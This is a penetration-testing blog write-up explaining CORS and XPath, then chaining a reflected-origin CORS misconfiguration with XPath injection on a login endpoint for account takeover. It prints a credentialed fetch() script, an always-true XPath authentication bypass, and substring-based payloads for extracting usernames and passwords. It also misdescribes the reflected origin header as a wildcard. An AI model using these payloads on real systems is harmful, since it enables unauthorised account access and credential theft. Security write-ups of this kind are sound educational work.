---
title: "CORS Misconfiguration to Account Takeover"
date: 2025-02-20
draft: false
description: "Chaining a CORS Misconfiguration with XPath-Injectino to take over arbitrary Accounts of the application"
---

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">

Recently, during a penetration testing engagement, I uncovered a chain of exploits that began with a <span class="text-primary-400">CORS misconfiguration</span> and culminated in an account takeover / <span class="text-primary-400">authentication bypass via XPath injection in an API endpoint</span>. This article will describe the essentials of CORS, XPATH injections, and the way I was able to exploit the chain.

---

## <i class="fa-solid fa-bars text-primary-400"></i> Basics

### What Is CORS?
Cross-Origin Resource Sharing (<span class="text-primary-400">CORS</span>) is a security feature implemented in web browsers that allows web pages to make requests to a different domain than the one that served the web page. In simpler terms, it <span class="text-primary-400">enables a web application running on one domain to request resources from another domain securely</span>.

### Same-Origin Policy
To understand CORS, it's essential to understand the <span class="text-primary-400">same-origin policy</span>, a fundamental security concept in web development. By default, a <span class="text-primary-400">web browser restricts scripts on a web page from making requests to a different domain</span>. This means a script loaded from <span class="text-primary-400">one origin cannot interact with resources from another origin</span>.

An origin is defined by three components:
- <span class="text-primary-400">Protocol</span>: The communication method (e.g., `http`, `https`)
- <span class="text-primary-400">Host</span>: (domain and subdomain, e.g., `example.com`, `api.example.com`)
- <span class="text-primary-400">Port</span>: The server port number (e.g., `:80`, `:443`)

For example:
- `https://www.example.com` and `https://api.example.com` are different origins because the subdomains (<span class="text-primary-400">Host</span>) differ
- `http://www.example.com` and `https://www.example.com` are different origins because the protocols differ

### How Does CORS Work?
CORS provides a way for the server to <span class="text-primary-400">relax the same-origin policy by specifying who can access its resourcesy</span>. It does this through HTTP headers that tell the browser whether to allow a web page to access resources from a different origin.

#### Allowed Origins
```HTTP
GET /page HTTP/1.1
Host: example.com
Origin: https://www.example.com
```

```HTTP
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://www.example.com
```

When sending a request with the Origin header set, the webserver will respond with the `Access-Control-Allow-Origin` header, and if allowed, the requested Origin.

#### Authentication

```HTTP
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://www.example.com
Access-Control-Allow-Credentials: true
```

If the allow credentials header is configured, the browser is instructed to include authentication credentials, e.g. cookies, in the request automatically.

---

### What Is XPath?
XPath (<span class="text-primary-400">XML Path Language</span>) is a query language used for selecting nodes from an XML document. It allows you to <span class="text-primary-400">navigate through elements and attributes in an XML document</span>, making it easier to extract and manipulate data.

#### Basic Concepts
<span class="text-primary-400">Nodes</span>: The fundamental units in an XML document, including elements, attributes, text, and comments.

```XML
<library>
  <book category="fiction">
    <title>The Adventures of Tom Sawyer</title>
    <author>Mark Twain</author>
  </book>

  <book category="non-fiction">
    <title>A Brief History of Time</title>
    <author>Stephen Hawking</author>
  </book>
</library>
```

<span class="text-primary-400">Expressions</span>: XPath uses path expressions to select nodes or node sets in an XML document.

> Select the First <book> Element

`/library/book[1]`

> Select <book> Elements with a Specific Attribute

`/book[@category='fiction']`

---

## <i class="fa-solid fa-hammer text-primary-400"></i> The Exploit

### Endpoint Enumeration
The first step in any penetration test involves mapping out the application's attack surface. Normally, I begin by enumerating the API endpoints of the target. However, every endpoint I discovered required an authentication bearer token, preventing any further interaction without valid credentials

### CORS Misconfiguration
While enumerating the application, I noticed that there was a CORS misconfiguration regarding allowed origins. Upon sending a request containing arbitrary Origins, I got the following responses.

```HTTP
GET / HTTP/1.1
Host: target.com
Origin: https://www.attacker.com
```

```HTTP
HTTP/1.1 200 OK
Access-control-allow-origin: attacker.com
Access-Control-Allow-Credentials: true
```

The `Access-Control-Allow-Origin` header was set to a <span class="text-primary-400">wildcard</span>, effectively allowing any origin to access the resources. Combined with `Access-Control-Allow-Credentials: true`, this meant that <span class="text-primary-400">browsers would include cookies</span> and authentication credentials in cross-origin requests.

#### Exploiting CORS
```JS
fetch('https://target-application.com/protected-endpoint', {
  method: 'GET',
  credentials: 'include' // Tell the browser to include saved credentials
})
.then(response => response.json())
.then(data => {
  console.log(data);
  // Potentially exfiltrate data to attacker-controlled server
});
```

This script attempts to access a protected endpoint, with the browser including any credentials due to the misconfigured CORS policy. <span class="text-primary-400">That essentially means, that we can use the victims session to interact with the protected API functions</span>. Now that we bypassed the protected endpoints, let us check if there are any vulneratbillities within those API functions.

### Exploiting XPath
During recon I found an endpoint called `/token`. This endpoint is essentially used to <span class="text-primary-400">login via POST parameters</span> (username, password) and <span class="text-primary-400">retreive an API bearer token</span>, which can then be used to access and use the API functions. Here, different users had different access rights on different endpoints.
The <span class="text-primary-400">endpoint is using an XML document as a Database</span>. Here, XPath queries are used to search for a `user:password` combination in the Database and authenticate them. A basic query might look something like this:

```python
/root/*[password='Test123' and username='MyUser']
```

#### Injection Payload
```HTTP
POST /token HTTP/1.1
Host: target-application.com
Content-Type: application/x-www-form-urlencoded

username=' or '1'='1&password=' or '1'='1
```

This payload (URL encoded) injects an <span class="text-primary-400">always-true condition</span> into the XPath query. The backend likely executed a query similar to:

```python
/root/*[password='' or '1'='1' and username='' or '1'='1']
```

Given the injected condition, the query most likely returns / uses the first user in the XML database, effectively bypassing authentication controls and <span class="text-primary-400">providing me with a valid Bearer Token for that account</span>, which I can then use to access their API functions.

#### Enumerating Users
To escalate the attack, we can try to enumerate usernames and extract passwords using XPath functions like `starts-with()` and `substring()`. By iterating over character positions and possible values, we can try to reconstructed usernames and passwords, gaining access to multiple accounts.

```HTTP
POST /token HTTP/1.1
Host: target-application.com
Content-Type: application/x-www-form-urlencoded

username=' or string-length(username)=5 and '1'='1&password=irrelevant
```

```HTTP
POST /token HTTP/1.1
Host: target-application.com
Content-Type: application/x-www-form-urlencoded

username=' or substring(username,1,1)='a' and '1'='1&password=irrelevant
```

## <i class="fa-solid fa-table-list text-primary-400"></i> Conclusion
This engagement underscored how a <span class="text-primary-400">seemingly minor issues can be chained together for significant impact</span>. A CORS misconfiguration allowed me to bypass the same-origin policy, and an XPath injection in the authentication mechanism enabled full account compromise.